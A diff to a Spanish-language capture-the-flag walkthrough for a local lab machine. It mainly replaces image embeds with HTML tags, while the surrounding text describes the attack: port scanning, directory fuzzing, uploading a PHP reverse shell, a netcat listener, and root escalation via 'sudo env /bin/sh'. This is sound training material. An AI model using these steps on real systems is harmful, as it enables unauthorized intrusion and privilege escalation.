@@ -4,10 +4,10 @@ Primero haremos un escaneo de la ip para ver los puertos abiertos y los servicio
 sudo nmap -sV -sC --min-rate 7000 -p- -Pn 172.17.0.2 -oN escaneo
 ```
 
-![[Pasted image 20240426142916.png]]
+<img src="Pasted image 20240426142916.png">
 
 Vemos que está corriendo una web en el puerto 80. Vamos a ver que esconde, para ello hay que poner la ip en el dispositivo.
-![[Pasted image 20240426143030.png]]
+<img src="Pasted image 20240426143030.png">
 
 Seguidamente haremos un fuzzing de la web ya que nos muestra la pagina por defecto de apache.
 
@@ -15,10 +15,10 @@ Seguidamente haremos un fuzzing de la web ya que nos muestra la pagina por defec
 gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,txt
 ```
 
-![[Pasted image 20240426143232.png]]
+<img src="Pasted image 20240426143232.png">
 
 Vemos que hay un archivo que se llaman upload.php, entonces introduciremos el archivo al lado de la ip.
-![[Pasted image 20240426143453.png]]
+<img src="Pasted image 20240426143453.png]]
 
 Vemos que esta web nos permite subir un archivo, entonces subiremos un archivo php para poder ejecutar una reverse shell.
 
@@ -216,9 +216,9 @@ function printit ($string) {
 ?> 
 ```
 
-![[Pasted image 20240426143910.png]]
+<img src="Pasted image 20240426143910.png">
 
-![[Pasted image 20240426143927.png]]
+<img src="Pasted image 20240426143927.png">
 
 Una vez se nos ha subido, nos pondremos en escucha con el puerto que hemos modificado en el archivo php.
 
@@ -226,16 +226,16 @@ Una vez se nos ha subido, nos pondremos en escucha con el puerto que hemos modif
 nc -lnvp 1234
 ```
 
-![[Pasted image 20240426144059.png]]
+<img src="Pasted image 20240426144059.png">
 
 Una vez estamos en escucha, nos situaremos en el directorio uploads en la url, para poder ejecutar nuestro archivo malicioso, de tal manera que no va a permitir tener conexión remota de comandos.
-![[Pasted image 20240426144215.png]]
+<img src="Pasted image 20240426144215.png">
 
 Lo ejecutamos dandole click. Regraseremos a la terminal y veremos que se ha establecido conexión remota.
-![[Pasted image 20240426144333.png]]
+<img src="Pasted image 20240426144333.png">
 
 Escribiremos `script /dev/null -c bash` para mostrar el prompt.
-![[Pasted image 20240426144429.png]]
+<img src="Pasted image 20240426144429.png">
 
 Con esto ya esteremos dentro, solo nos queda conseguir acceso a root (usuario administrador). Para ello miraremos que binarios podemos ejecutar como usuario.
 
@@ -243,7 +243,7 @@ Con esto ya esteremos dentro, solo nos queda conseguir acceso a root (usuario ad
 sudo -l
 ```
 
-![[Pasted image 20240426144547.png]]
+<img src="Pasted image 20240426144547.png">
 
 Vemos que tenemos el binario env habilitado al usuario, así que vamos a proceder a explotarlo.
 
@@ -251,10 +251,10 @@ Vemos que tenemos el binario env habilitado al usuario, así que vamos a procede
 sudo /usr/bin/env /bin/sh
 ```
 
-![[Pasted image 20240426144816.png]]
+<img src="Pasted image 20240426144816.png">
 
 ```
 whoami
 ```
 
-![[Pasted image 20240426144839.png]]
+<img src="Pasted image 20240426144839.png">
